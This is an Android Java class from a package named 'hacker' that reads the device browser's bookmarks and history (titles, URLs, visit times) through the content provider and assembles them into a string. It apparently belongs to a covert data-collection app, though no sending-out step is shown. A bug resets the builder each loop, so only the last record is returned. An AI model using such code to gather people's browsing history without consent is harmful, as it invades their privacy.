/**
 * 
 */
package com.fan.hacker;

import java.sql.Date;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.List;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.net.Uri;
import android.provider.Browser;

/**
 * @author Administrator
 *
 */
public class BrowserRecord {
	private Context ctx;

	public BrowserRecord(Context ctx) {
		super();
		this.ctx = ctx;
	}
	String records = null;  
    StringBuilder recordBuilder = new StringBuilder();  
    //查询系统默认浏览器的历史记录
    Uri uri =Uri.parse("content://browser/bookmarks");
    //查询chrome浏览器历史记录,这个比较复杂，需要一个专门的数据库内容监听类来实现
   // uri =Uri.parse("content://com.android.chrome.browser/history");
    public String getRecords(Uri uri) {  
        // ContentResolver contentResolver = getContentResolver();  
        Cursor cursor = ctx.getContentResolver().query(uri, new String[] {"title", "url", "date" }, "date!=?",  
                new String[] { "null" }, "date desc");  
        while (cursor != null && cursor.moveToNext()) {  
            String url = null;  
            String title = null;  
            String time = null;  
            String date = null;  
  
            recordBuilder = new StringBuilder();  
            title = cursor.getString(cursor.getColumnIndex("title"));  
            url = cursor.getString(cursor.getColumnIndex("url"));  
  
            date = cursor.getString(cursor.getColumnIndex("date"));  
  
            SimpleDateFormat dateFormat = new SimpleDateFormat(  
                    "yyyy-MM-dd hh:mm;ss");  
            Date d = new Date(Long.parseLong(date));  
            time = dateFormat.format(d);  
            recordBuilder.append("标题："+title+";"+"链接："+url+";"+"时间："+time+";");
            System.out.println(title + url + time);  
        } 
        return recordBuilder.toString(); 
    }  
    public void test() {
    	ContentResolver contentResolver = ctx.getContentResolver();
        String orderBy = Browser.BookmarkColumns.VISITS + " DESC";
        String whereClause = Browser.BookmarkColumns.BOOKMARK + " = 1";
        Cursor cursor = contentResolver.query(Browser.BOOKMARKS_URI, Browser.HISTORY_PROJECTION, whereClause, null, orderBy);
        List<String>listTitle = new ArrayList<String>();
        List<String>listUrl = new ArrayList<String>();
        List<Bitmap> listBitmap = new ArrayList<Bitmap>();
        while(cursor!=null && cursor.moveToNext()){
            listTitle.add(cursor.getString(cursor.getColumnIndex(Browser.BookmarkColumns.TITLE)));
            listUrl.add(cursor.getString(cursor.getColumnIndex(Browser.BookmarkColumns.URL)));
           // byte[] b = cursor.getBlob(cursor.getColumnIndex(Browser.BookmarkColumns.THUMBNAIL));
//            if(b!=null){
//                listBitmap.add(BitmapFactory.decodeByteArray(b, 0, b.length));
//            }else{
//                listBitmap.add(((BitmapDrawable)(getResources().getDrawable(R.drawable.ic_launcher_browser))).getBitmap());
//            }
        }
        System.out.println(listTitle.toString() + listUrl.toString() ); 

	}
}
